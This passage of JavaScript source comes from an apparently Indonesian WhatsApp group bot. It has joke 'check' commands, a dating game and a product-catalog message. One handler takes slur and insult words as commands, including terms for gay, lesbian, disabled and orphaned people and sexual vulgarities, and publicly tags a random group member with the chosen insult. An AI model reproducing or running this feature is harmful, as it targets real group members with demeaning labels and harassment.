				const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v', '30% Semangat bang Merawat Dirinya><', '20% Semangat Ya bang👍', '40% Wahh bang><', '50% abang Ganteng deh><', '60% Hai Ganteng🐊', '70% Hai Ganteng🐊', '62% Bang Ganteng><', '74% abang ni ganteng deh><', '83% Love You abang><', '97% Assalamualaikum Ganteng🐊', '100% Bang Pake Susuk ya??:v', '29% Semangat Bang:)', '94% Hai Ganteng><', '75% Hai Bang Ganteng', '82% wihh abang Pasti Sering Perawatan kan??', '41% Semangat:)', '39% Lebih Semangat🐊']
				const teng = gan[Math.floor(Math.random() * gan.length)]
				m.reply(`Nama : ${q}\nJawaban : *${teng}*`)
			}
			break
			case 'cantikcek':
			case 'cekcantik': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
				const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v', '30% Semangat Kaka Merawat Dirinya><', '20% Semangat Ya Kaka👍', '40% Wahh Kaka><', '50% kaka cantik deh><', '60% Hai Cantik🐊', '70% Hai Ukhty🐊', '62% Kakak Cantik><', '74% Kakak ni cantik deh><', '83% Love You Kakak><', '97% Assalamualaikum Ukhty🐊', '100% Kakak Pake Susuk ya??:v', '29% Semangat Kakak:)', '94% Hai Cantik><', '75% Hai Kakak Cantik', '82% wihh Kakak Pasti Sering Perawatan kan??', '41% Semangat:)', '39% Lebih Semangat🐊']
				const tik = can[Math.floor(Math.random() * can.length)]
				m.reply(`Nama : ${q}\nJawaban : *${tik}*`)
			}
			break
			case 'ceksifat':
			case 'sifatcek': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
				var a = await randomNomor(100)
				var b = await randomNomor(100)
				let ce = ['Baik Hati', 'Sombong', 'Pelit', 'Dermawan', 'Rendah Hati', 'Rendah Diri', 'Pemalu', 'Penakut', 'Pengusil', 'Cengeng']
				const c = ce[Math.floor(Math.random() * ce.length)]
				let de = ['Rajin', 'Malas', 'Membantu', 'Ngegosip', 'Jail', 'Gak jelas', 'Shoping', 'Chattan sama Doi', 'Chattan di WA karna Jomblo', 'Sedih', 'Kesepian', 'Bahagia']
				const d = de[Math.floor(Math.random() * de.length)]
				var e = await randomNomor(100)
				var f = await randomNomor(100)
				var g = await randomNomor(100)
				var h = await randomNomor(100)
				let cksft = `*SIFAT ${text}* 🔖\n\n❏ Nama : *${text}*\n❏ Ahlak Baik : *${a}%*\n❏ Ahlak Buruk : *${b}%*\n❏ Orang yang : *${c}*\n❏ Selalu : *${d}*\n❏ Kecerdasan : *${e}%*\n❏ Kenakalan : *${f}%*\n❏ Keberanian : *${g}%*\n❏ Ketakutan : *${h}%*`
				m.reply(cksft)
			}
			break
			case 'masadepan':
			case 'masadepannya': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
				var a = await randomNomor(10)
				var b = await randomNomor(10)
				var c = await randomNomor(10)
				var d = await randomNomor(10)
				var e = await randomNomor(10)
				var f = await randomNomor(10)
				var g = await randomNomor(10)
				var h = await randomNomor(10)
				let msdpn = [
					`${text} akan menjadi orang yang kaya, keluarga yang harmonis, memiliki ${b} anak, memiliki ${d}, memiliki kendaraan, memiliki rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang harmonis, memiliki ${c}, memiliki ${a} anak, memiliki kendaraan, memiliki rumah`,
					`${text} akan menjadi orang yang miskin, keluarga yang sederhana, memiliki ${a} anak, tidak memiliki kendaraan, rumah ngontrak`,
					`${text} akan menjadi orang yang sederhana, keluarga yang dicerai, memiliki ${e} anak, memiliki ${b} kendaraan, memiliki ${b} rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${b} anak, memiliki ${b} kendaraan, memiliki ${a} rumah`,
					`${text} akan menjadi orang yang miskin, keluarga yang dicerai memiliki ${b} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
					`${text} akan menjadi orang yang kaya, keluarga yang sederhana, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${b} rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang harmonis, memiliki ${a} anak, memiliki ${c} kendaraan, memiliki ${a} rumah`,
					`${text} akan menjadi orang yang miskin, tidak memiliki keluarga (jomblo), tidak memiliki anak, tidak memiliki kendaraan, tidak memiliki rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${d} anak, memiliki ${a} kendaraan, memiliki ${b} rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang kacau, tidak memiliki anak (Gugur), memiliki ${b} kendaraan, memiliki ${a} rumah`,
					`${text} akan menjadi orang yang sangat kaya, keluarga yang sangat harmonis, memiliki ${e} anak, memiliki ${f} kendaraan, memiliki ${g} rumah`,
					`${text} akan menjadi orang yang sangat miskin, keluarga yang sederhana, memiliki ${g} anak, tidak memiliki kendaraan, rumah ngontrak`,
					`${text} akan menjadi orang yang kaya, keluarga yang pelit, memiliki ${b} anak, memiliki ${b} kendaraan, memiliki ${b} rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang pelit, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang dicerai, memiliki ${b} anak, memiliki ${a} kendaraan, rumah ngontrak`,
					`${text} akan menjadi orang yang sangat sederhana, keluarga yang sakinah, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang sangat sederhana, memiliki ${a}${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang sangat sederhana, memiliki ${b} anak kembar, memiliki ${c} kendaraan, memiliki ${b} rumah`,
					`${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${b} anak kembar dan ${a} anak lagi, memiliki ${a} kendaraan, memiliki ${a} rumah`,
				]
				const msdpan = msdpn[Math.floor(Math.random() * msdpn.length)]
				m.reply(msdpan)
			}
			break
			case 'jadian': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				vreden.jadian = vreden.jadian ? vreden.jadian : {}
				let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
				if (!user) return m.warning(`*Tag/Reply Seseorang!*\n\nContoh:\n${prefix + command} @0`)
				if (user === m.sender) return reply("Anyingg mawunya jadian sama diri sendiri 😂")
				if (user === botNumber) return reply("😓Aku hanya sebuah bot maaf")
				let pasangan = usersdb[user].pacar
				let pasangan2 = usersdb[m.sender].pacar
				if (pasangan2 === user) {
					reply(`Loee kan udah jadian smaa dia 😑`)
				} else if (pasangan) {
					reply(`Target wes duwe pacar mbokk🥶\n\n@${pasangan.split("@")[0]} ayangmu mo diambil🙈`)
				} else if (pasangan2) {
					reply(`Hayoloo mo selingkuh🙈\n\n@${pasangan2.split("@")[0]} tengok nihh kelakuan ayangmu🤢`)
				} else {
					let ktnmbk = ["Ada saat di mana aku nggak suka sendiri. Tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.", "Aku baru sadar ternyata selama ini kamu kaya! Kaya yang aku cari selama ini. Kamu mau nggak jadi pacarku?", "Aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.", "Aku boleh kirim CV ke kamu nggak? Soalnya aku mau ngelamar jadi pacar.", "Aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?", "Aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. Maukah kamu menerima cintaku?", "Aku ingin bilang sesuatu. Udah lama aku suka sama aku, tapi aku nggak berani ngomong. Jadi, kuputuskan untuk WA saja. Aku pengin kamu jadi pacarku.", "Aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. Aku mencintaimu, maukah kamu menjadi pacarku?", "Aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. Maukah kau jadi pacarku?", "Aku mau chat serius sama kamu. Selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. Kalau nggak keberatan, kamu mau jadi pacarku?", "Aku melihatmu dan melihat sisa hidupku di depan mataku.", "Aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.", "Aku menyukaimu dari dulu. Kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. Akan sempurna jika kamu yang menjadi spesial di hati.", "Aku naksir banget sama kamu. Maukah kamu jadi milikku?", "Aku nggak ada ngabarin kamu bukan karena aku gak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. Mungkin kamu akan kaget mendengarnya. Selama ini aku menyukaimu.", "Aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. Aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. Aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.", "Aku nggak tahu sampai kapan usiaku berakhir. Yang aku tahu, cintaku ini selamanya hanya untukmu.", "Aku sangat menikmati waktu yang dihabiskan bersama hari ini. Kita juga sudah lama saling mengenal. Di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.", "Aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. Namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. Maukah kamu menjadi kekasihku?", "Aku siapkan mental untuk hari ini. Kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.", "Aku tahu kita gak seumur, tapi bolehkan aku seumur hidup sama kamu?", "Aku tahu kita sudah lama sahabatan. Tapi nggak salah kan kalau aku suka sama kamu? Apa pun jawaban kamu aku terima. Yang terpenting itu jujur dari hati aku yang terdalam.", "Aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. Jika kau mengerti akan kode ini maka kita akan bersama.", "Aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.", "Apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. Karena berada di sampingmu, anugerah terindah bagiku. Jadilah kekasihku, hey kamu.", "Atas izin Allah dan restu mama papa, kamu mau nggak jadi pacarku?", "Bagaimana kalau kita jadi komplotan pencuri? Aku mencuri hatimu dan kau mencuri hatiku.", "Bahagia itu kalau aku dan kamu telah menjadi kita.", "Besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. Biar aku ada kerjaan buat selalu mikirin kamu.", "Biarkan aku membuatmu bahagia selamanya. Kamu hanya perlu melakukan satu hal: Jatuh cinta denganku.", "Biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. Biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!", "Biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?", "Bisakah kamu memberiku arahan ke hatimu? Sepertinya aku telah kehilangan diriku di matamu.", "Bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. Dijawab ya.", "Caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. Aku mau kamu jadi milikku.", "Cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.", "Cintaku ke kamu tuh kayak angka 5 sampai 10. Nggak ada duanya. Aku mau kamu jadi satu-satunya wanita di hatiku.", "Cowok mana yang berani-beraninya nyakitin kamu. Sini aku obati, asal kamu mau jadi pacar aku.", "Hai, kamu lagi ngapain? Coba deh keluar rumah dan lihat bulan malam ini. Cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. Gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?", "Hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. Senyummu menerangi hidupku dan semua kegelapan menghilang. Maukah kamu menjadi milikku?", "Ini bukan rayuan, tapi ini yang aku rasakan. Aku ingin bertukar tulang denganmu. Aku jadi tulang punggungmu, kamu jadi tulang rusukku. Jadian yuk!", "Ini cintaku, ambillah. Ini jiwaku, gunakan itu. Ini hatiku, jangan hancurkan. Ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.", "Izinkan aku mengatakan sesuatu yang menurutku sangat penting. Hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. Tetaplah di sana dan jadilah kekasihku. Mau?", "Jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. Biarkan aku melakukannya sekarang.", "Kalau aku matahari, kamu mau nggak jadi langitku? Biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.", "Kalau kamu membuka pesan ini, berarti kamu suka sama aku. Kalau kamu membalas pesan ini, artinya kamu sayang sama aku. Kalau kamu mengabaikan pesan ini, berarti kamu cinta sama aku. Kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.", "Kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.", "Kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. Kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. Aku ingin kamu selalu bersamaku. Aku mencintaimu.", "Kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.", "Kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. Maukah kamu jadi pacar aku?", "Kamu kenal Iwan nggak? Iwan to be your boy friend.", "Kamu mau nggak jadi matahari di kehidupanku? Kalau mau, menjauhlah 149.6 juta KM dari aku sekarang!", "Kamu nggak capek HTS-an sama aku? Aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. Kita pacaran aja, yuk?", "Kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. Iya, aku.", "Kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. Apakah kamu akan membiarkan aku menjadi orangnya?", "Kamu tahu enggak kenapa aku ngambil jurusan elektro? Karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.", "Kamu tahu kenapa hari ini aku menyatakan semua ini padamu? Karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.", "Kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?", "Kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. Aku mau kamu jadi milikku.", "kepada cewek incaran bukanlah perkara yang mudah. Ada banyak hal yang perlu dipertimbangkan agar cintamu bisa diterima si doi. Selain memilih waktu yang tepat, kata-kata untuk nembak cewek pun harus dipersiapkan.", "Ketika aku bertemu denganmu, aku tak peduli dengan semuanya. Namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. Dan apakah ini cinta?", "Ketika engkau memandangku, engkau akan melihat fisikku. Tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.", "Ketika Hawa tercipta buat sang Adam, begitu indah kehidupan mereka izinkan aku menjadi sang Adam/Hawa buatmu karena aku sangat mencintaimu.", "Ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.", "Kita udah saling tahu masa lalu masing-masing. Tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. Mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?", "Ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. Resah jika kamu tak menjadi milikku selamanya.", "Lebih spesial dari nasi goreng, lebih indah dari purnama. Ya, jika kamu yang temani akhir hidupku.", "Maaf sebelumnya karena cuma bisa bilang lewat WA. Sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. Mau?", "Makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. Sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.", "Makan tahu bumbu petis. Merenung sambil makan buah duku. Aku bukan lelaki yang romantis. Namun, maukah kau jadi pacarku?", "Makasih, ya, selama ini sudah mau temani aku. Entah itu dalam suka ataupun duka. Tapi sekarang aku mau kamu berubah. Aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.", "Malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.", "Mataku mencarimu ketika kamu tidak ada. Hatiku sakit ketika aku tidak menemukanmu. Kamu adalah alasan untuk semua kebahagiaanku dan tanpamu hidupku akan sangat membosankan. Maukah kamu terus bersamaku?", "Mau jadi pacarku nggak, lagi gabut nih. Coba dulu 1 bulan kalau nyaman lanjut deh.", "Menjadi teman memang menyenangkan. Akan lebih membahagiakan jika kamu menjadi milikku.", "Meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. Tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya. - Zarry Hendrik", "Meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. Hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.", "Mungkin aku bukan Obama, tapi aku senang kalau bisa manggil kamu, o sayang. Kamu mau nggak mulai saat ini aku panggil seperti itu?", "Mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. Tapi satu yang aku sanggup, membuatmu bahagia. Izinkan aku membuktikannya, ya!", "Neng, bakar-bakaran yuk! | Bakar apa? | Kita bakar masa lalu dan buka lembaran baru dengan cinta kita.", "Nggak perlu basa basi. Kita udah kenal lama, aku suka kamu apa adanya. Jadian yuk!", "Pepatah mengatakan, empat sehat lima sempurna. Namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.", "Saatnya aku mengungkapkan perasaan yang terdalam kepadamu. Aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.", "Saking jatuh cintanya aku sama kamu. Mendengar kamu kentut aja aku sudah bahagia.", "Satu tambah satu sama dengan dua. Aku tanpamu nggak bisa apa-apa. Satu dua tiga sepuluh. Aku maunya kamu jadi pacarkuh.", "Secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.", "Sejak kenal kamu, bawaannya pengin belajar terus. Belajar jadi yang terbaik. Untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?", "Senjata bertuah amatlah sakti. Kalah oleh iman nan hakiki. Maukah kau jadi orang yang aku kasihi? Aku janji cintaku sampai mati.", "Seseorang bermimpi tentangmu setiap malam. Seseorang tidak bisa bernapas tanpamu, kesepian. Seseorang berharap suatu hari kau akan melihatnya. Seseorang itu adalah aku.", "Setelah hari berlalu, aku yakin kamu pilihanku.", "Setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. Aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. Aku mencintaimu.", "Suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. Akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. Perempuan itu adalah kamu.", "Suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?", "Tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.", "Tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. Ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. Apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.", "Tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.", "Tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. Itu adalah kamu.", "Telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. Karena aku mau kamu jadi pacar aku?", "Tidak peduli seberapa sederhanya dan ketidakjelasan kamu. Tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. Aku mau kamu jadi pacarku.", "Untuk apa memajang foto berdua? Yang aku mau fotomu ada dalam buku nikahku kelak. Maukah kamu jadi pacarku?"];
					let katakata = await pickRandom(ktnmbk)
					let teks = `*Love Message...*\n\n@${m.sender.split("@")[0]}\n❤️❤️\n@${user.split("@")[0]}\n\n"${katakata}"`
					vreden.jadian[user] = [
						reply(teks),
						m.sender
					]
					reply(`Kamu baru saja mengajak @${user.split("@")[0]} jadian\n\n@${user.split("@")[0]} silahkan beri keputusan🎉\n${prefix}terima\n${prefix}tolak`)
				}
			}
			break
			case 'terima': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (vreden.jadian[m.sender]) {
					let user = vreden.jadian[m.sender][1]
					usersdb[user].pacar = m.sender
					usersdb[m.sender].pacar = user
					reply(`Horeee🎉🎉\n\n${m.sender.split("@")[0]} jadian dengan\n❤️ ${user.split("@")[0]}\n\nSemoga langgeng 🙈😋`)
					delete vreden.jadian[m.sender]
				} else {
					reply("Gak ada yang nembak lu 😂")
				}
			}
			break
			case 'tolak': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				if (vreden.jadian[m.sender]) {
					let user = vreden.jadian[m.sender][1]
					reply(`@${user.split("@")[0]} ditolak ngabb 😓`)
					delete vreden.jadian[m.sender]
				} else {
					reply("Gak ada yang nembak lu 😂")
				}
			}
			break
			case 'putus': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				let pasangan = usersdb[m.sender].pacar
				if (pasangan) {
					usersdb[m.sender].pacar = ""
					usersdb[pasangan].pacar = ""
					reply(`Kamu putus sama @${pasangan.split("@")[0]} 😓🤔`)
				} else {
					reply("Lu jomblo ngapain putus🥸")
				}
			}
			break
			case 'cekpacar': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				try {
					let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					if (!user) return m.warning(`*Tag/Reply Seseorang!*\n\nContoh:\n${prefix + command} @0`)
					let pasangan = usersdb[user].pacar
					if (pasangan) {
						reply(`@${user.split("@")[0]} udah ❤️ sama @${pasangan.split("@")[0]}`)
					} else {
						reply(`@${user.split("@")[0]} masih jomblo 😋`)
					}
				} catch (error) {
					reply(`@${user.split("@")[0]} tidak ada didalam database😞`)
				}
			}
			break
			case 'bego':
			case 'goblok':
			case 'janda':
			case 'perawan':
			case 'babi':
			case 'tolol':
			case 'pinter':
			case 'pintar':
			case 'asu':
			case 'bodoh':
			case 'gay':
			case 'lesby':
			case 'bajingan':
			case 'jancok':
			case 'anjing':
			case 'ngentod':
			case 'ngentot':
			case 'monyet':
			case 'mastah':
			case 'newbie':
			case 'bangsat':
			case 'bangke':
			case 'sange':
			case 'sangean':
			case 'dakjal':
			case 'horny':
			case 'wibu':
			case 'puki':
			case 'peak':
			case 'pantex':
			case 'pantek':
			case 'setan':
			case 'iblis':
			case 'cacat':
			case 'yatim':
			case 'piatu': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				let member = participants.map(u => u.id).filter(v => v !== vreden.user.jid)
				let org = member[Math.floor(Math.random() * member.length)];
				vreden.sendMessage(m.chat, {
					text: `Anak ${command} di sini adalah @${org.split('@')[0]}`,
					mentions: [org]
				}, {
					quoted: m
				})
			}
			break;
			case 'sangecek':
			case 'ceksange':
			case 'gaycek':
			case 'cekgay':
			case 'lesbicek':
			case 'ceklesbi': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
				const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
				const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
				reply(`Nama : ${q}\nJawaban : *${sange}%*`)
			}
			break
			case 'kapankah': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
				const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
				const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
				reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
			}
			break
			case 'wangy': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh : ${prefix}wangy Vreden`)
				qq = q.toUpperCase()
				awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
				reply(awikwok)
			}
			break
			//▢━━━━━━━━━━━━━━「 MAIN COMMAND 」━━━━━━━━━━━━━━▢
			case 'katalog': {
				const uploadFile = {
					upload: vreden.waUploadToServer
				};
				var imageMessage = await prepareWAMessageMedia({
						image: {
							url: "https://telegra.ph/file/951b678d8c410a5fb7280.jpg"
						},
					},
					uploadFile,
				);
				const product = {
					productImage: imageMessage.imageMessage,
					productId: "7066960336725723",
					title: "WhatsApp Bussines Api",
					description: "Nyari Apa Dek?",
					currencyCode: "IDR",
					priceAmount1000: "25000000",
					productImageCount: 1,
				};
				const productData = {
					product: product,
					businessOwnerJid: "6287824695047@s.whatsapp.net",
				};
				const productMessage = {
					productMessage: productData
				};
				var response = await generateWAMessageFromContent(
					m.chat,
					proto.Message.fromObject(productMessage),
					m.quoted && m.quoted.fromMe ? {
						contextInfo: {
							...m.msg.contextInfo
						}
					} : {
						quoted: m
					},
				);
				await vreden.relayMessage(m.chat, response.message, {
					messageId: response.key.id,
				});
			}
			break
			case 'sc':
			case 'price':
			case 'script': {
				let button = [{
						"name": "cta_url",
						"buttonParamsJson": `{\"display_text\":\"Chat Owner💫\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\"}`
					},
					{
						"name": "cta_url",
